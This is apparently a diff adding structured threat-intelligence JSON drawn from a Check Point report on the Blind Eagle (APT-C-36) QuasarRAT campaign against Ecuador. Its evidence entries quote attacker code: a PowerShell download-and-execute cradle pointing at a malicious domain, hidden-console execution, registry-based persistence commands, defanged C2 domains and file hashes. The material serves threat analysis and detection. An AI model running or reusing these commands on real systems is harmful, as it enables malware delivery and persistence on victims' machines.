+        "stage": null,
+        "notes": "alias_from_entity; alias_head",
+        "schema_version": "v3.1-projector",
+        "evidence_span": "APT-C-36, also known as Blind Eagle, is a financially motivated threat group that has been launching indiscriminate attacks against citizens of various countries in South America since at least 2018."
+      }
+    },
+    {
+      "id": "rel_0002",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "type": "loads",
+      "head_id": "ent_file_powershell.exe",
+      "tail_id": "ent_malware_QuasarRAT",
+      "head_type": "File",
+      "tail_type": "Malware",
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_48"
+      ],
+      "primary_evidence_id": "ev_48",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "loads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "carry_loader_to_payload",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0003",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "type": "targets",
+      "head_id": "ent_threatactor_APT-C-36",
+      "tail_id": "ent_victim_Ecuador",
+      "head_type": "ThreatActor",
+      "tail_type": "Victim",
+      "confidence": 0.88,
+      "evidence_ids": [
+        "ev_2",
+        "ev_39"
+      ],
+      "primary_evidence_id": "ev_2",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "",
+        "schema_version": "v2.0-evidence"
+      }
+    },
+    {
+      "id": "rel_0004",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "type": "uses_malware",
+      "head_id": "ent_threatactor_APT-C-36",
+      "tail_id": "ent_malware_QuasarRAT",
+      "head_type": "ThreatActor",
+      "tail_type": "Malware",
+      "confidence": 0.9,
+      "evidence_ids": [
+        "ev_3"
+      ],
+      "primary_evidence_id": "ev_3",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "uses_malware",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "execution",
+        "notes": "event_use",
+        "schema_version": "v4.0-event-refiner"
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step_id": "step_001",
+      "stage": "execution",
+      "relation_id": "rel_0002",
+      "type": "loads",
+      "summary": "powershell.exe loads QuasarRAT",
+      "evidence_ids": [
+        "ev_48"
+      ]
+    },
+    {
+      "step_id": "step_002",
+      "stage": "execution",
+      "relation_id": "rel_0004",
+      "type": "uses_malware",
+      "summary": "APT-C-36 uses_malware QuasarRAT",
+      "evidence_ids": [
+        "ev_3"
+      ]
+    }
+  ],
+  "evidences": [
+    {
+      "id": "ev_1",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s1"
+      },
+      "text": "APT-C-36, also known as Blind Eagle, is a financially motivated threat group that has been launching indiscriminate attacks against citizens of various countries in South America since at least 2018.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_2",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s2"
+      },
+      "text": "In a recent campaign targeting Ecuador based organizations, CPR detected a new infection chain that involves a more advanced toolset.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_3",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s3"
+      },
+      "text": "The backdoor chosen for this campaign is typically used by espionage campaigns, which is unusual for this group",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_4",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s4"
+      },
+      "text": "ACTIVE CAMPAIGNS AGAINST COLOMBIAN TARGETS For the last few months, we have been observing the ongoing campaigns orchestrated by Blind Eagle, which have mostly adhered to the TTPs described above — phishing emails pretending to be from the Colombian government.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_10",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s2"
+      },
+      "text": "QuasarRAT is an open source trojan available in multiple sources like Github.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_13",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s5"
+      },
+      "text": "Although QuasarRAT is not a dedicated banking Trojan, it can be observed from the sample’s embedded strings that the group’s main goal in the campaign was to intercept victim access to their bank account.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_16",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s8"
+      },
+      "text": "TRANSUNION Banco Popular portalpymes Blockchain DashboardDavivienda Some extra features added to Quasar by this group are a function named “ActivarRDP” (activate RDP) and two more to activate and deactivate the system Proxy:",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_17",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s1"
+      },
+      "text": "A BETTER CAMPAIGN FEATURING NEWER TOOLS One specific sample caught our attention as it was related to a government institution from Ecuador and not from Colombia.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_18",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s2"
+      },
+      "text": "Similarly to the campaign described above, the geo-filter server in this campaign redirects requests outside of Ecuador and Colombia to the website of the Ecuadorian Internal Revenue Service:",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_19",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s1"
+      },
+      "text": "If contacted from Colombia or Ecuador, the downloaded file from Mediafire will be a RAR archive with a password.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_21",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s3"
+      },
+      "text": "This code just adds a new stage in the infection chain: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0) os.system(wsx) mshta is a utility that executes Microsoft HTML Applications, and the attackers abuse it here to download and execute the next stage, which contains VBS code embedded in an HTML.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_22",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s4"
+      },
+      "text": "<script language=\"VBScript\"> self.close </script> Usually campaigns by Blind Eagle abuse legitimate file sharing services such as Mediafire or free dynamic domains like “*.linkpc.net”; this case is different, and the next stage is hosted at the malicious domain upxsystems[.]com.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_23",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s1"
+      },
+      "text": "Set-ItemProperty -path 'hkcu:\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\Shell\\\\MuiCache\\\\' -name \"$env:PUBLIC\\\\py\\\\python.exe.ApplicationCompany\" -value \"Python Software Foundation\"",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_26",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s2"
+      },
+      "text": "For Windows 7 the task will be created by downloading an XML from the C2 “upxsystems[.]com”, while for Windows 8, 8.1, and 10 the malware will create the task using the cmdlet “New-ScheduledTask*”.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_37",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s3"
+      },
+      "text": "CONCLUSION Blind Eagle is a strange bird among APT groups.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_39",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s5"
+      },
+      "text": "This latest campaign targeting Ecuador highlights how, over the last few years, Blind Eagle has matured as a threat — refining their tools, adding features to leaked code bases, and experimenting with elaborate infection chains and “Living off the Land” as seen with the clever abuse of mshta .",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_42",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s8"
+      },
+      "text": "Artificial Intelligence (AI) and Indicators of Compromise (IoCs) used in the past train the Harmony Email & Office platform for what to look for in complex zero-day phishing attacks.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_43",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 1,
+        "section": "rule",
+        "sentence_id": "p1_r1"
+      },
+      "text": "In both cases, the link in question consists of a legitimate link-shortening service URL that geolocates victims and makes them communicate with a different “server” depending on the original country ( https://gtly[.]to/QvlFV_zgh ). If the incoming HTTP request originates from outside Colombia, the server aborts the infection chain, acts innocent and redirects the client to the official website of the migration department of the Colombian Ministry of Foreign Affairs.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_48",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r5"
+      },
+      "text": "CreateObject(\"Wscript.Shell\").run\"powershell.exe -noexit \"\"$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''https://[malicious domain]/wins''))';$a3=\"\"$a1,$a2\"\";IEX(-join $a3)\"\"\", 0, true",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_52",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r2"
+      },
+      "text": "$url = \"<https://www.python.org/ftp/python/3.9.9/python-3.9.9-embed-win32.zip>\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_53",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r3"
+      },
+      "text": "$output = \"$env:PUBLIC\\\\py.zip\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_56",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r6"
+      },
+      "text": "$zip = $shell.Namespace(\"$env:PUBLIC\\\\py.zip\")",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_57",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r7"
+      },
+      "text": "Remove-Item \"$env:PUBLIC\\\\py.zip\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_58",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r8"
+      },
+      "text": "New-Item -Path HKCU:\\\\Software\\\\Classes\\\\Applications\\\\python.exe\\\\shell\\\\open\\\\command\\\\ -Value \"\"\"$env:PUBLIC\\\\py\\\\python.exe\"\" \"\"%1\"\"\" -Force",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_59",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r9"
+      },
+      "text": "Set-ItemProperty -path 'hkcu:\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\Shell\\\\MuiCache\\\\' -name \"$env:PUBLIC\\\\py\\\\python.exe.ApplicationCompany\" -value \"Python Software Foundation\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_60",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r10"
+      },
+      "text": "Set-ItemProperty -path 'hkcu:\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\Shell\\\\MuiCache\\\\' -name \"$env:PUBLIC\\\\py\\\\python.exe.FriendlyAppName\" -value \"Python\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_62",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r1"
+      },
+      "text": "8e864940a97206705b29e645a2c2402c2192858357205213567838443572f564",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_63",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r2"
+      },
+      "text": "2702ea04dcbbbc3341eeffb494b692e15a50fbd264b1d676b56242aae3dd9001",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_64",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r3"
+      },
+      "text": "f80eb2fcefb648f5449c618e83c4261f977b18b979aacac2b318a47e99c19f64",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_65",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r4"
+      },
+      "text": "68af317ffde8639edf2562481912161cf398f0edba6e06745d90c1359554c76e",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_66",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r5"
+      },
+      "text": "61685ea4dc4ca4d01e0513d5e23ee04fc9758d6b189325b34d5b16da254cc9f4",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_67",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r6"
+      },
+      "text": "https://gtly[.]to/QvlFV_zgh",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_68",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r7"
+      },
+      "text": "https://gtly[.]to/cuOv3gNDi",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_69",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r8"
+      },
+      "text": "https://gtly[.]to/dGBeBqd8z",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_70",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r9"
+      },
+      "text": "c63d15fe69a76186e4049960337d8c04c6230e4c2d3d3164d3531674f5f74cdf",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_71",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r10"
+      },
+      "text": "353406209dea860decac0363d590096e2a8717dd37d6b4d8b0272b02ad82472e",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_72",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r11"
+      },
+      "text": "a03259900d4b095d7494944c50d24115c99c54f3c930bea08a43a8f0a1da5a2e",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_73",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r12"
+      },
+      "text": "46addee80c4c882b8a6903cced9b6c0130ec327ae8a59c5946bb954ccea64a12",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_74",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r13"
+      },
+      "text": "c067869ac346d007a17e2e91c1e04ca0f980e8e9c4fd5c7baa0cb0cc2398fe59",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_75",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r14"
+      },
+      "text": "10fd1b81c5774c1cc6c00cc06b3ed181b2d78191c58b8e9b54fa302e4990b13d",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_76",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r15"
+      },
+      "text": "c4ff3fb6a02ca0e51464b1ba161c0a7387b405c78ead528a645d08ad3e696b12",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_77",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r16"
+      },
+      "text": "ac1ea54f35fe9107af1aef370e4de4dc504c8523ddaae10d95beae5a3bf67716",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_78",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule_backfill",
+        "sentence_id": "p8_rb78"
+      },
+      "text": "laminascol[.]linkpc[.]net",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_79",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule_backfill",
+        "sentence_id": "p8_rb79"
+      },
+      "text": "QvlFV_zgh https://gtly[.]to/cuOv3gNDi https://gtly[.]to/dGBeBqd8z laminascol[.]linkpc[.]net systemwin[.]linkpc[.]net upxsystems[.]com c63d15fe69a76186e4049960337d8c04c6230e4c2d3d31",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_80",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule_backfill",
+        "sentence_id": "p8_rb80"
+      },
+      "text": "https://www.mediafire[.]com/file/cfnw8rwufptk5jz/migracioncolombiaprocesopendienteid2036521045875referenciawwwmigraciongovco.LHA/file",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_81",
+      "evidence_type": "report_text",
+      "report_id": "Checkpoint_BlindEagle-Targeting-Ecuador-Sharpened-Tools(01-05-2023)",
+      "locator": {
+        "page": 8,
+        "section": "rule_backfill",
+        "sentence_id": "p8_rb81"
+      },
+      "text": "4d01e0513d5e23ee04fc9758d6b189325b34d5b16da254cc9f4 https://www.mediafire[.]com/file/cfnw8rwufptk5jz/migracioncolombiaprocesopendienteid2036521045875referenciawwwmigraciongovco.LHA",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    }
+  ],
+  "structured_relation_blocks": [
+    {
+      "evidence_id": "ev_39",
+      "page": 7,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT-C-36",
+        "ent_victim_Ecuador",
+        "ent_threatactor_Blind_Eagle"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_1",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT-C-36",
+        "ent_threatactor_Blind_Eagle"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_22",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT-C-36",
+        "ent_threatactor_Blind_Eagle"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_4",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT-C-36",
+        "ent_threatactor_Blind_Eagle"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_37",
+      "page": 7,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT-C-36",
+        "ent_threatactor_Blind_Eagle"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    }
+  ]
+}
